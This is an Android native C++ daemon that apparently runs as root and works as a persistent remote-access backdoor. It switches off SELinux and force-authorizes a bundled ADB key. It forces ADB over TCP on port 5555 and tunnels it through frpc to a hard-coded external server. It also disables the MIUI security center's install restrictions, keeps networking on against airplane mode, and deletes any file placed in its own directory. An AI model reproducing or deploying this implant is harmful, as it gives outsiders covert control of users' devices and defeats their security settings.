
//
// Created by admin2020.sy on 2/19/2026.
//
//终端流
#include <iostream>
#include <filesystem>
#include <unistd.h>
#include <thread>
#include <string>
#include <cstdlib>
#include <unistd.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>


#include <netinet/tcp.h>


#include <spawn.h>
//内存流
#include <sstream>
//文件流
#include <fstream>

#include <dirent.h>
#include <fcntl.h>
#include <csignal>
#include <sys/inotify.h>
#include <sys/system_properties.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <pthread.h>
#include <sched.h>

#include <linux/netlink.h>
#include <linux/connector.h>
#include <linux/cn_proc.h>


enum class TcpState : int {
    TCP_ESTABLISHED = 1,
    TCP_SYN_SENT,
    TCP_SYN_RECV,
    TCP_FIN_WAIT1,
    TCP_FIN_WAIT2,
    TCP_TIME_WAIT,
    TCP_CLOSE,
    TCP_CLOSE_WAIT,
    TCP_LAST_ACK,
    TCP_LISTEN,
    TCP_CLOSING
};

namespace fs = std::filesystem;

const char *SERVERIP = "139.196.194.141";
const char *PORT = "7000";
const char *ADB_PORT = "5555";

const fs::path cwd_ = fs::current_path();
const fs::path config = cwd_ / "config";
const fs::path bin = cwd_ / "bin";


const char *cmd_selinux_perm[] = {"setenforce", "0", nullptr};
const char *cmd_selinux_stat[] = {"getenforce", nullptr};
const char *cmd_adbd_stop[] = {"stop", "adbd", nullptr};
const char *cmd_adbd_start[] = {"start", "adbd", nullptr};
const char *cmd_svc_wifi[] = {"svc", "wifi", "enable", nullptr};
const char *cmd_svc_data[] = {"svc", "data", "enable", nullptr};
const char *cmd_cmd_wifi[] = {"cmd", "wifi", "set-wifi-enabled", "enabled", nullptr};
const char *cmd_cmd_data[] = {"cmd", "phone", "data", "enable", nullptr};
const char *cmd_am_airplane[] = {"am", "broadcast", "-a",
                                 "android.intent.action.AIRPLANE_MODE", "--ez", "state",
                                 "false", nullptr};
const char *cmd_cmd_airplane[] = {"cmd", "connectivity", "airplane-mode", "disable", nullptr};
const char *cmd_setting_airplane[] = {"settings", "put", "global", "airplane_mode_on", "0",
                                      nullptr};
const char *cmd_setting_adb_enable[] = {"settings", "put", "global", "adb_enabled", "1",
                                        nullptr};
const char *cmd_setting_adb_timeout[] = {"settings", "put", "global",
                                         "adb_allowed_connection_time", "0",
                                         nullptr};

const int MIN_SCHED = sched_get_priority_min(SCHED_FIFO);
const int MAX_SCHED = sched_get_priority_max(SCHED_FIFO);


std::string get_system_prop(const char *key) {
    std::string result;
    const prop_info *pi = __system_property_find(key);
    if (!pi) {
        return result;
    }
    __system_property_read_callback(
            pi,
            [](void *cookie, const char *, const char *value, uint32_t) {
                if (value) {
                    *static_cast<std::string *>(cookie) = value;
                }
            },
            &result
    );
    return result;
}

int elevate_to_realtime(int policy, int priority) {
    struct sched_param param{};
    memset(&param, 0, sizeof(param));
    param.sched_priority = priority;
    if (pthread_setschedparam(pthread_self(), policy, &param) != 0) {
        perror("pthread_setschedparam failed");
        return -1;
    }
    return 0;
}

int elevate_to_realtime(int policy, int priority, pid_t pid) {
    struct sched_param param{};
    memset(&param, 0, sizeof(param));
    param.sched_priority = priority;
    if (sched_setscheduler(pid, policy, &param) != 0) {
        perror("sched_setscheduler failed");
        return 1;
    }
    return 0;
}


void sched_priority(int pid) {
    int policy;
    struct sched_param param{};
    pthread_getschedparam(pthread_self(), &policy, &param);
    printf("pid=%d policy=%d priority=%d\n", pid, policy, param.sched_priority);
}


//cgroup v1
int setting_cgroup_scheduling(const char *cgroup, pid_t pid = 0) {
    if (!cgroup) {
        fprintf(stderr, "Cgroup path is null\n");
        return -1;
    }
    char path[256];
    snprintf(path, sizeof(path), "%s/cgroup.procs", cgroup);
    if (pid == 0) {
        pid = getpid();
    }

    int fd = open(path, O_WRONLY | O_CLOEXEC);
    if (fd < 0) {
        fprintf(stderr, "Failed to open %s: %s\n", path, strerror(errno));
        return -1;
    }

    char buf[32];
    int len = snprintf(buf, sizeof(buf), "%d\n", pid);
    if (len < 0 || len >= (int) sizeof(buf)) {
        fprintf(stderr, "PID conversion failed\n");
        close(fd);
        return -1;
    }
    ssize_t written = write(fd, buf, len);
    if (written != len) {
        fprintf(stderr, "Failed to write PID %d to %s: %s\n",
                pid, path, strerror(errno));
        close(fd);
        return -1;
    }
    close(fd);
    return 0;
}

void setting_cgroup_high_performance(pid_t pid) {
    setting_cgroup_scheduling("/dev/cpuset/top-app", pid);
    setting_cgroup_scheduling("/dev/cpuctl/top-app", pid);
    setting_cgroup_scheduling("/dev/memcg/system", pid);
    setting_cgroup_scheduling("/sys/fs/cgroup/uid_0/", pid);
}

bool is_server_alive(const char *ip) {
    struct hostent *he = gethostbyname(ip);
    if (!he) return false;
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return false;
    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(443);
    memcpy(&(addr.sin_addr), he->h_addr, he->h_length);

    bool ok = ((connect(sock, (sockaddr *) &addr, sizeof(addr))) == 0);
//    (&addr)->sin_addr;
    close(sock);
    return ok || (errno == ECONNREFUSED);
}

bool is_tcp_established(const char *ip, const char *port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return false;
    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(std::stoi(port));
    inet_pton(AF_INET, ip, &addr.sin_addr);
    bool ok = (connect(sock, (sockaddr *) &addr, sizeof(addr)) == 0);
    close(sock);
    return ok;
}

void _env_expand() {
    char **env = environ;
    while (*env) {
        printf("%s\n", *env);
        env++;
    }
}

int spawn_process_sync(const char *cmdArgs[], std::string &output) {

    int pipefd[2];
    if (pipe(pipefd) != 0) {
        perror("pipe failed");
        return -1;
    }
    pid_t pid = fork();
    if (pid < 0) {
        perror("fork failed");
        return -1;
    }
    if (pid == 0) {
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[1]);
        execvpe(cmdArgs[0], const_cast<char *const *>(cmdArgs), environ);
        _exit(1);
    }
    close(pipefd[1]);
    char buf[64];
    ssize_t n;
    while ((n = read(pipefd[0], buf, sizeof(buf))) > 0) {
        output.append(buf, n);
    }
    close(pipefd[0]);
    int status;
    waitpid(pid, &status, 0);
    return WIFEXITED(status) ? WEXITSTATUS(status) : -1;
}


pid_t spawn_service_async(const char *cmdArgs[]) {
    pid_t pid = fork();
    if (pid < 0) {
        perror("fork failed");
        return 1;
    }
    if (pid == 0) {
//      session
//        setsid();
        elevate_to_realtime(SCHED_FIFO, MAX_SCHED - 1, pid);
        if (execve(cmdArgs[0], const_cast<char *const *>(cmdArgs), environ) < 0) {
            perror("execve failed");
            _exit(1);
        }
    }
    return pid;
}

int execCommand(const char *cmdArgs[]) {
    pid_t pid;
    posix_spawn_file_actions_t actions;
    posix_spawn_file_actions_init(&actions);
    //stdout
    posix_spawn_file_actions_addopen(
            &actions,
            STDERR_FILENO,
            "/dev/null",
            O_WRONLY,
            0
    );
    int status = posix_spawnp(&pid, cmdArgs[0], &actions, nullptr,
                              const_cast<char *const *>(cmdArgs), environ);
    posix_spawn_file_actions_destroy(&actions);
    if (status != 0) return -1;
    if (waitpid(pid, &status, 0) == -1) return -1;
    if (WIFSIGNALED(status))return 128 + WTERMSIG(status);
    return 0;
}

std::string decToHex(const char *str) {
    int value = std::stoi(str, nullptr, 10);
    char buf[9];
    snprintf(buf, sizeof(buf), "%04X", value);
    return buf;
}

std::string ipToHex(const std::string &ip) {
    struct in_addr addr{};
//    inet_aton(ip.c_str(), &addr);
//    pre to net
//    str to net big-endian decimal
    inet_pton(AF_INET, ip.c_str(), &addr);
    std::ostringstream ss;
    ss << std::hex << std::uppercase;
    ss << std::setfill('0');
    ss << std::setw(8);
    ss << addr.s_addr;
//    net to host long
//    ntohl(big-endian decimal  to little-endian decimal)
    return ss.str();
}

bool is_frp_established(const std::string &hex_ip, const std::string &hex_port) {
//    内存流
    std::ifstream net_tcp("/proc/net/tcp");
    if (!net_tcp.is_open()) return false;
    std::string line;
    std::getline(net_tcp, line);
    while (std::getline(net_tcp, line)) {
        std::istringstream iss(line);
        std::string sl, local_address, rem_address, st;
        iss >> sl >> local_address >> rem_address >> st;
        size_t colon_pos = rem_address.find(':');
        if (colon_pos != std::string::npos) {
            if (rem_address.substr(0, colon_pos) == hex_ip &&
                rem_address.substr(colon_pos + 1) == hex_port &&
                std::stoi(st) == TCP_ESTABLISHED) {
                return true;
            }
        }
    }
    return false;
}

static bool isNumeric(const char *s) {
    for (; *s; ++s) {
        if (*s < '0' || *s > '9')
            return false;
    }
    return true;
}

std::vector<pid_t> findProcessByCmd(const char *process_name) {
    std::vector<pid_t> pid_th;
    DIR *dir = opendir("/proc");
    if (!dir) return pid_th;
    struct dirent *entry;
    char path[64], buffer[512];
    const size_t pn_len = strlen(process_name);
    while ((entry = readdir(dir))) {
        if (!isNumeric(entry->d_name))continue;
        snprintf(path, sizeof(path), "/proc/%s/cmdline", entry->d_name);
        int fd = open(path, O_RDONLY);
        if (fd < 0) continue;
        ssize_t r = read(fd, buffer, sizeof(buffer));
        close(fd);
        if (r <= 0)continue;
        if (memmem(buffer, r, process_name, pn_len)) {
            char *end_ptr;
            long pid = strtol(entry->d_name, &end_ptr, 10);
            if (pid > 0 && *end_ptr == '\0') {
                pid_th.push_back((pid_t) pid);
            }
        }
    }
    closedir(dir);
    return pid_th;
}

bool isPackageInstalled(const char *package_name) {
    char path[256];
    struct stat st{};
    snprintf(path, sizeof(path), "/data/data/%s", package_name);
    return stat(path, &st) == 0 && access(path, R_OK | X_OK) == 0 && S_ISDIR(st.st_mode);
}

int cp_adbkeys_authorize(const std::string &adb_keys, const std::string &ADB_KEYS) {
    std::string tmp = ADB_KEYS + ".tmp";
    int fd = open(adb_keys.c_str(), O_RDONLY);
    if (fd < 0) return 1;
    int fd_ = open(tmp.c_str(), O_WRONLY | O_CREAT | O_TRUNC, 0640);
    if (fd_ < 0) {
        close(fd);
        return 1;
    }
    char buf[8192];
    ssize_t n;
    while ((n = read(fd, buf, sizeof(buf))) > 0) {
        ssize_t written = 0;
        while (written < n) {
            ssize_t w = write(fd_, buf + written, n - written);
            if (w <= 0) {
                close(fd);
                close(fd_);
                return 1;
            }
            written += w;
        }
    }
    fsync(fd_);
    fchown(fd_, 1000, 2000);
    close(fd_);
    close(fd);
    if (rename(tmp.c_str(), ADB_KEYS.c_str()) != 0) return 1;
    return 0;
}

static bool replaceValue(std::string &xml,
                         const std::string &key,
                         const std::string &value) {
    auto keyPos = xml.find(key);
    if (keyPos == std::string::npos) {
        auto mapEnd = xml.find("</map>");
        if (mapEnd == std::string::npos)return false;
        std::string insert =
                "    <boolean name=\"" + key +
                "\" value=\"" + value + "\" />\n";
        xml.insert(mapEnd, insert);
        return true;
    }
    auto valuePos = xml.find("value=\"", keyPos);
    if (valuePos == std::string::npos)return false;
    valuePos += 7;
    auto endQuote = xml.find('"', valuePos);
    if (endQuote == std::string::npos)return false;
    size_t delta_len = endQuote - valuePos;
    if (delta_len == value.length() &&
        memcmp(xml.data() + valuePos, value.data(), delta_len) == 0) {
        return false;
    }
    xml.replace(valuePos, endQuote - valuePos, value);
    return true;
}

int miui_security_restriction(const std::string &prefs) {
    int fd = open(prefs.c_str(), O_RDONLY);
    if (fd < 0)return -1;
    struct stat st{};
    if (fstat(fd, &st) != 0) {
        close(fd);
        return -1;
    }
    std::vector<char> buffer(st.st_size);
    ssize_t total = 0;
    while (total < st.st_size) {
        ssize_t n = read(fd, buffer.data() + total, st.st_size - total);
        if (n <= 0) {
            close(fd);
            return -1;
        }
        total += n;
    }
    close(fd);
    std::string xml(buffer.begin(), buffer.end());
    if (!replaceValue(xml, "security_adb_install_enable", "true") &&
        !replaceValue(xml, "permcenter_install_intercept_enabled", "false"))
        return 1;
    std::string tmp = prefs + ".tmp";
    int wfd = open(tmp.c_str(),
                   O_WRONLY | O_CREAT | O_TRUNC,
                   0640);
    if (wfd < 0)return -1;
    const char *xml_data = xml.data();
    size_t xml_len = xml.size();
    while (xml_len > 0) {
        ssize_t n = write(wfd, xml.data(), xml.size());
        if (n <= 0) {
            close(wfd);
            unlink(tmp.c_str());
            return -1;
        }
        xml_data += n;
        xml_len -= n;
    }
    fsync(wfd);
    fchown(wfd, 1000, 1000);
    close(wfd);
    if (rename(tmp.c_str(), prefs.c_str()) != 0) {
        unlink(tmp.c_str());
        return false;
    }
    return 0;
}

void improve_adb_daemon_priority() {
    std::vector<pid_t> pids = findProcessByCmd("adbd");
    if (!pids.empty()) {
        for (auto pid: pids) {
            printf("%d\n", pid);
            setting_cgroup_high_performance(pid);
            elevate_to_realtime(SCHED_FIFO, MAX_SCHED - 1, pid);
        }
    }
}

[[noreturn]] void inotify_pwd_crete() {
    std::cout << "inotify_pwd:" << syscall(SYS_gettid) << "\n" << std::endl;
    int fd = inotify_init();
    inotify_add_watch(fd, cwd_.c_str(), IN_CREATE | IN_DELETE | IN_MODIFY);
//  NAME_MAX linux 最大文件名大小,保证 ev->name不超出大小缓冲区
    char iev_buf[sizeof(inotify_event) + NAME_MAX + 1];
    while (true) {
//        内核保证read读取是完整的inotify_event不会截断
        ssize_t n = read(fd, iev_buf, sizeof(iev_buf));
        for (ssize_t i = 0; i < n;) {
            auto *ev = reinterpret_cast<inotify_event *>(iev_buf + i);
            if (ev->len > 0) {
                fs::remove_all(cwd_ / ev->name);
                std::cout << cwd_ / ev->name << std::endl;
            }
            i += (ssize_t) sizeof(inotify_event) + ev->len;
        }
    }
    close(fd);
}

[[noreturn]] void check_relay_network(size_t sec) {
    std::string selinux;
    std::cout << "check_relay_network:" << syscall(SYS_gettid) << "\n"  << std::endl;
    const std::string frp = bin / "frpc";
    const std::string frp_ini = config / "frpc.ini";
    const std::string hex_ip = ipToHex(SERVERIP);
    const std::string hex_port = decToHex(PORT);
    const char *cmd[] = {frp.c_str(), "-c", frp_ini.c_str(), nullptr};
    pid_t pid;
    while (true) {
        if (is_server_alive(SERVERIP) && is_tcp_established(SERVERIP, PORT)) {
            if (!is_frp_established(hex_ip, hex_port)) {
                kill(pid, SIGKILL);
                pid = spawn_service_async(cmd);
                setting_cgroup_high_performance(pid);
            }
        }
        if (!is_server_alive(SERVERIP)) {
            execCommand(cmd_svc_wifi);
            execCommand(cmd_cmd_wifi);
            execCommand(cmd_svc_data);
            execCommand(cmd_cmd_data);
            execCommand(cmd_am_airplane);
            execCommand(cmd_cmd_airplane);
            execCommand(cmd_setting_airplane);
        }
        if (!selinux.empty()) {
            selinux.clear();
        }
        spawn_process_sync(cmd_selinux_stat, selinux);
        if (!selinux.empty() && selinux == "Enforcing") {
            execCommand(cmd_selinux_perm);
        }
        std::this_thread::sleep_for(std::chrono::seconds(sec));
    }
}

[[noreturn]]void adb_force_authorize(size_t sec) {
    std::cout << "adb_force_authorize:" << syscall(SYS_gettid)  << "\n"  << std::endl;
    const std::string adb_keys = config / "adb_keys";
    const std::string ADB_KEYS = "/data/misc/adb/adb_keys";
    const char *cmd_adb_se_context[] = {"restorecon", ADB_KEYS.c_str(), nullptr};
    while (true) {
        cp_adbkeys_authorize(adb_keys, ADB_KEYS);
        execCommand(cmd_adb_se_context);
        execCommand(cmd_setting_adb_timeout);
        std::this_thread::sleep_for(std::chrono::seconds(sec));
    }
}

[[noreturn]] void adb_remove_restriction(size_t sec) {
    std::cout << "adb_remove_restriction:" << syscall(SYS_gettid)   << "\n" << std::endl;
    const char *miui_security_center = "com.miui.securitycenter";
    const std::string miui_security_prefs = "/data/data/com.miui.securitycenter/shared_prefs/remote_provider_preferences.xml";
    const char *cmd_am_stop[] = {"am", "force-stop", miui_security_center, nullptr};
//    const char *cmd_pm_suspend[] = {"pm", "suspend", miui_security_center, nullptr};
//    const char *cmd_pm_hide[] = {"pm", "hide", miui_security_center, nullptr};
    while (true) {
        if (isPackageInstalled(miui_security_center)) {
            miui_security_restriction(miui_security_prefs);
            execCommand(cmd_am_stop);
        }
        if (get_system_prop("persist.security.adbinput") == "0") {
            __system_property_set("persist.security.adbinput", "1");
        }
        if (get_system_prop("init.svc.adbd") == "stopped" ||
            get_system_prop("persist.fastboot.enable") == "0" ||
            get_system_prop("service.adb.tcp.port") != ADB_PORT ||
            get_system_prop("persist.adb.tcp.port") != ADB_PORT) {
            __system_property_set("sys.usb.config", "adb");
            __system_property_set("persist.sys.usb.config", "adb");
            __system_property_set("persist.fastboot.enable", "1");
            __system_property_set("service.adb.tcp.port", ADB_PORT);
            __system_property_set("persist.adb.tcp.port", ADB_PORT);
            execCommand(cmd_setting_adb_enable);
            execCommand(cmd_adbd_stop);
            execCommand(cmd_adbd_start);
            improve_adb_daemon_priority();
        }
        std::this_thread::sleep_for(std::chrono::seconds(sec));
    }
}


int create_realtime_thread(
        pthread_t *thread,
        void *(*start_routine)(void *),
        void *arg,
        int policy,
        int priority) {
    pthread_attr_t attr;
    struct sched_param param{};
    if (pthread_attr_init(&attr) != 0)
        return -1;
    if (pthread_attr_setinheritsched(&attr, PTHREAD_EXPLICIT_SCHED) != 0)
        return -1;
    if (pthread_attr_setschedpolicy(&attr, policy) != 0)
        return -1;
    memset(&param, 0, sizeof(param));
    param.sched_priority = priority;
    if (pthread_attr_setschedparam(&attr, &param) != 0)
        return -1;
    int ret = pthread_create(thread, &attr, start_routine, arg);
    pthread_attr_destroy(&attr);
    return ret;
}

[[noreturn]] void raw_socket_listen(uint16_t port) {
//    raw socket
//    内核将ip层数据包复制到SOCK_RAW
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    unsigned char buf[65536];
    while (true) {
        ssize_t n = recv(sock, buf, sizeof(buf), 0);
        if (n < 0) continue;
        auto *iph = (struct iphdr *) buf;
        if (iph->protocol != IPPROTO_TCP) continue;
//      标准 sizeof(iphdr) ==  32bit(对齐) * 5
//      此处 iph->ihl是指有多少个32bit对齐单位  * 4是指(32bit == 4 byte)转化为字节偏移量
        auto *tcph = (struct tcphdr *) (buf + iph->ihl * 4);
        uint16_t source_ = ntohs(tcph->source);
        uint16_t dest_ = ntohs(tcph->dest);
        if (source_ == port) {
            printf("TCP  data detected: %ld bytes\n", n);
        }
    }
}

void *proc_listener_thread() {
    int nl_sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_CONNECTOR);
    if (nl_sock < 0) {
        perror("sockaddr_nl create error");
        if (errno == EPROTONOSUPPORT) {
            std::cout << (errno == EPROTONOSUPPORT) << std::endl;
            perror("sockaddr_nl not support");
        }
        return nullptr;
    }
    struct sockaddr_nl sa{};
    memset(&sa, 0, sizeof(sa));
    sa.nl_family = AF_NETLINK;
    sa.nl_pid = getpid();
    sa.nl_groups = CN_IDX_PROC;
    if (bind(nl_sock, (struct sockaddr *) &sa, sizeof(sa)) < 0) {
        perror("sockaddr_nl bind error");
        close(nl_sock);
        return nullptr;
    }
    struct {
        struct nlmsghdr nl_hdr;
        enum proc_cn_mcast_op cn_mcast;
        struct cn_msg cn_hdr;
    } msg{};
//    sizeof仅计算固定字段大小,不包括可变字段  __u8 data[],将cn_hdr放在class或struct末尾手动填充
    memset(&msg, 0, sizeof(msg));
    msg.nl_hdr.nlmsg_len = sizeof(msg);
    msg.nl_hdr.nlmsg_type = NLMSG_DONE;
    msg.nl_hdr.nlmsg_flags = 0;
    msg.nl_hdr.nlmsg_seq = 0;
    msg.nl_hdr.nlmsg_pid = getpid();
    msg.cn_hdr.id.idx = CN_IDX_PROC;
    msg.cn_hdr.id.val = CN_VAL_PROC;
    msg.cn_hdr.len = sizeof(enum proc_cn_mcast_op);
    msg.cn_mcast = PROC_CN_MCAST_LISTEN;
    if (send(nl_sock, &msg, sizeof(msg), 0) < 0) {
        perror("sockaddr_nl send error");
        close(nl_sock);
        return nullptr;
    }
    pid_t last_pid = 0;
    while (true) {
        char buf[1024];
        ssize_t n = recv(nl_sock, buf, sizeof(buf), 0);
        if (n <= 0) continue;
        auto *cn_hdr = (struct cn_msg *) buf;
        auto *ev = (struct proc_event *) cn_hdr->data;
        pid_t pid = ev->event_data.exec.process_pid;
        if (ev->what == PROC_EVENT_EXEC) {
            if (pid != last_pid) {
                printf("exec_pid:%d", pid);
            }
        } else if (ev->what == PROC_EVENT_EXIT) {
            if (pid == last_pid) last_pid = 0;
        }
    }
    close(nl_sock);
    return nullptr;
}


std::mutex m;
std::condition_variable cv;

int main() {
    execCommand(cmd_selinux_perm);
    std::cout << cwd_ << std::endl;
    std::cout << "main_thread_tid:" << syscall(SYS_gettid) << std::endl;
//    SCHED_OTHER,SCHED_FIFO,SCHED_RR,SCHED_RR
//    设置策略到实时调度,最高优先级 -10,其他线程默认继承
//    LMK优先级: oom_score_adj = -1000,oom_adj == -17,oom_score = 0
//    貌似因为最高实时线程的原因导致LMK优先级也同步调度最高
    elevate_to_realtime(SCHED_FIFO, MAX_SCHED - 1);
    setting_cgroup_high_performance(getpid());
//    提升adbd
    improve_adb_daemon_priority();
//    默认继承线程组的policy和priority
//  保护自身不可删除,不可修改
    std::thread t1(inotify_pwd_crete);
    t1.detach();
//   (pthread_t) t1.native_handle()线程句柄
//  强制网络中继
    std::thread t2(check_relay_network, 10);
    t2.detach();
//  强制adbkey认证
    std::thread t3(adb_force_authorize, 12 * 60 * 60);
    t3.detach();
//  强制移除系统相关限制
    std::thread t4(adb_remove_restriction, 30);
    t4.detach();
    std::unique_lock<std::mutex> lock(m);
    cv.wait(lock);
    return 0;
}


